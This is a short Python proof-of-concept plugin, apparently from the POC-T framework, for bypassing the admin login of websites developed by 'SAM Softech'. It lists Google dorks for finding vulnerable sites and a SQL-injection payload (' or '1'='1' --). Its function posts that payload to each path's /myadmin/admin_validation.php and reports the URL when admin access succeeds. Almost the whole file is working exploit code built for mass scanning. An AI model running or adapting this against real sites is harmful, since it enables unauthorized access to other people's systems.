#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
SAM Softech Admin Page Bypass

Dork
  Google Dork:intext:Developed By : SAM Softech
  Google Dork:"Developed By : SAM Softech"

Payload
  Username: ' or '1'='1' -- ' ~ ' or '1'='1'
  Password: ' or '1'='1' -- ' ~ ' or '1'='1'
"""

import requests
from plugin.urlparser import iterate_path


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    payload = "' or '1'='1' -- ' ~ ' or '1'='1'"
    data = {'userid': payload, 'userpass': payload, 'submit': 'Enter'}
    for each in iterate_path(url):
        if '?' in each:
            continue
        target = each.rstrip('/') + '/myadmin/admin_validation.php'
        try:
            r = requests.post(target, data=data, timeout=15)
            if 'form name="frmNextstep"' in r.content:
                return target
        except Exception:
            pass
    return False
